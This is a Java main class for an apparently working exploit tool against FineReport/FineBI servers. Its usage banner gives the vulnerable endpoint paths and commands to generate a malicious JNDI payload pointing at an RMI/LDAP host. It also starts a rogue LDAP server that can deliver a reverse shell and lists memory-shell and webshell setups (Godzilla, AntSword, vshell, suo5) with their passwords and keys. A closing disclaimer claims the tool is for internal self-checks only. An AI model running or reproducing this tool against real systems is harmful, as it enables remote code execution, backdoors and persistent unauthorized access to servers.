package com.example.frchannel;


import com.example.frchannel.payload.finedruid;

public class main {
    public static void main(String[] args) throws Exception{
        if (args.length > 0){
            String mode = args[0];
            if (mode.equals("-bin")) {
                check(args[1]);
                finedruid.getpayload(args[1]);
            }else if (mode.equals("-ldap")) {
                String[] strings = removeFirstElement(args);
                HookLdapServer.main(strings);
            }
        }else {
            print();
            System.exit(-1);
        }

    }

    public static void print() throws Exception {
        System.err.println("\n" +
                "   ▄████████  ▄█  ███▄▄▄▄      ▄████████  ▄█       ████████▄     ▄████████    ▄███████▄  ▄████████ \n" +
                "  ███    ███ ███  ███▀▀▀██▄   ███    ███ ███       ███   ▀███   ███    ███   ███    ███ ███    ███ \n" +
                "  ███    █▀  ███▌ ███   ███   ███    █▀  ███       ███    ███   ███    ███   ███    ███ ███    █▀  \n" +
                " ▄███▄▄▄     ███▌ ███   ███  ▄███▄▄▄     ███       ███    ███   ███    ███   ███    ███ ███        \n" +
                "▀▀███▀▀▀     ███▌ ███   ███ ▀▀███▀▀▀     ███       ███    ███ ▀███████████ ▀█████████▀  ███        \n" +
                "  ███        ███  ███   ███   ███    █▄  ███       ███    ███   ███    ███   ███        ███    █▄  \n" +
                "  ███        ███  ███   ███   ███    ███ ███▌    ▄ ███   ▄███   ███    ███   ███        ███    ███ \n" +
                "  ███        █▀    ▀█   █▀    ██████████ █████▄▄██ ████████▀    ███    █▀   ▄████▀      ████████▀  \n" +
                "                                         ▀                                      power by unam4    \n\n"+
                "漏洞路径: /webroot/decision/remote/design/channel\n\n"+
                "加载jsp依赖： /webroot/decision/file?path=org.apache.jasper.servlet.JasperInitializer&type=class\n\n"+
                "获取版本: /webroot/decision/system/info\n\n"+
                "生成恶意bin：java -jar fineldapc.jar -bin  [rmi|ldap]://host:port/obj\n\n"+
                "开启恶意ldap：java -jar fineldapc.jar -ldap <port> <CLASS:classname>/<resershell:ip#port>/<FILE:filepath>\n\n"+
                "classname: (fineBI都可以使用，finereport请用jsp类型)\n\n" +
                "tomcatecho (head头 Etags: base64enc(Command)) \n" +
                "godzilla_mem    加密器: JAVA_AES_BASE64 密码: Hwtfhlitg 密钥: Loklewkvqbo 请求路径: /* 请求头: User-Agent: Orjuagk\n" +
                "suo5    (suo5 -d -l 0.0.0.0:7788 --auth test:test123 --ua 'Nuexq' -t http(s)://ip:port/webroot/decision) \n" +
                 "vshell(agent): 加密器: JAVA_AES_BASE64 密码: Iddzfpe 密钥: Septtdzjura 请求路径: /* 请求头: Referer: Aiskhs 脚本类型: JSP\n"+
                "anstword  类型：jspjs 密码: b\n"+
                "suo5jsp: suo5 -t http://10.211.55.2:8075/webroot/tunnel.jsp\n"+"godzillajsp: 加密器: JAVA_AES_BASE64 密码: fine 密钥: ldapc 请求路径: /*\n\n"+
                "重要: !!!\n免责声明 该工具仅用于安全自查检测\n" +
                "由于传播、利用此工具所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。\n" +
                "本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。\n" +
                "该工具只授权于企业内部进行问题排查，请勿用于非法用途，请遵守网络安全法，否则后果作者概不负责");
    }

    public static void  check(String command) throws Exception {
        if (!command.toLowerCase().startsWith("ldap://") && !command.toLowerCase().startsWith("rmi://")) {
            throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
        }
    }

    public static String[] removeFirstElement(String[] array) {
        if (array == null || array.length == 0) {
            return new String[0]; //
        }
        String[] newArray = new String[array.length - 1];

        System.arraycopy(array, 1, newArray, 0, newArray.length);

        return newArray;
    }
}
